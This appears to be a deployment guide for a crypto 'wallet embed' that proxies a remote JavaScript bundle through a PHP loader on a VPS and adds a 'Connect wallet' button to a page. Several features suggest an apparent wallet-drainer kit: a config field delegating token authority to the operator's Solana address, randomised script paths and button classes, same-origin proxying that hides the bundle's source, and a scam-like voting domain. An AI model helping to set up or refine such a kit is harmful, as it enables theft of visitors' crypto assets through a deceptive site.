# Wallet embed

**VPS:** nginx + HTML + PHP proxy (`loader.php` + `config.php`)  
**Vercel:** JS bundle + `/profile` popup only

---

## What you put on the VPS

| Item | What you do |
|------|-------------|
| **nginx** | One `location` → `loader.php` (see `nginx/wallet-connect.conf`) |
| **HTML** | `<script src="/vault38472">` + button class |
| **config.php** | Your secrets (Reown ID, Vercel URL, delegate, etc.) — edit once |

Upload **`vps/loader.php`** and **`vps/embed-shared.php`** once (you don’t edit these).

---

## 1. Upload to VPS

```text
/var/www/mysite/vps/
├── loader.php          ← PHP proxy endpoint
├── embed-shared.php
├── config.php          ← copy from config.example.php, fill in
├── cache/              ← writable by www-data
└── public/
    └── index.html      ← your page(s)
```

```bash
apt install -y nginx php-fpm php-cli php-mbstring php-xml curl
mkdir -p /var/www/mysite/vps/cache
chown -R www-data:www-data /var/www/mysite/vps
chmod 640 /var/www/mysite/vps/config.php
```

---

## 2. config.php (one-time)

```bash
cd /var/www/mysite/vps
cp config.example.php config.php
nano config.php
```

```php
'reown_project_id' => 'YOUR_REOWN_ID',
'site_url' => 'https://vote-moonshot.top',
'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/wallet.bundle.js',
'script_path' => 'vault38472',
'button_class' => 'K7mQ2',
'connect_popup_enabled' => true,
'token_delegate' => 'YOUR_SOLANA_ADDRESS',
'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=YOUR_KEY',
```

Popup URL is auto: `https://YOUR-PROJECT.vercel.app/profile`

---

## 3. nginx

Use `nginx/wallet-connect.conf`. Adjust paths and PHP socket:

```nginx
root /var/www/mysite/vps/public;

location = /vault38472 {
    include fastcgi_params;
    fastcgi_pass unix:/run/php/php8.4-fpm.sock;
    fastcgi_param SCRIPT_FILENAME /var/www/mysite/vps/loader.php;
}
```

```bash
nginx -t && systemctl reload nginx
```

---

## 4. HTML

```html
<script src="/vault38472" defer></script>
<button type="button" class="K7mQ2">Connect wallet</button>
```

Path = `script_path` in config. Class = `button_class` in config.

Or with `.php` in the URL:

```html
<script src="/vault38472.php" defer></script>
```

---

## 5. Vercel

1. Deploy repo → **Root Directory:** `vercel`
2. No secrets required on Vercel if using VPS `config.php`
3. Test: `https://YOUR-PROJECT.vercel.app/wallet.bundle.js` and `/profile`

Reown dashboard → allow **vote-moonshot.top**

---

## How the PHP proxy works

```
Browser → GET /vault38472
       → nginx → loader.php
       → reads config.php
       → prints window.__WALLET_EMBED_CONFIG__=...
       → fetches wallet.bundle.js from Vercel (cached in vps/cache/)
```

User picks wallet → popup opens Vercel `/profile` (400×720, no URL params).

---

## Test

```bash
curl -I -H "Referer: https://vote-moonshot.top/" https://vote-moonshot.top/vault38472
```

Expect **200** + `Content-Type: application/javascript`.

After Vercel redeploy, clear cache:

```bash
rm -f /var/www/mysite/vps/cache/wallet.bundle.js
```
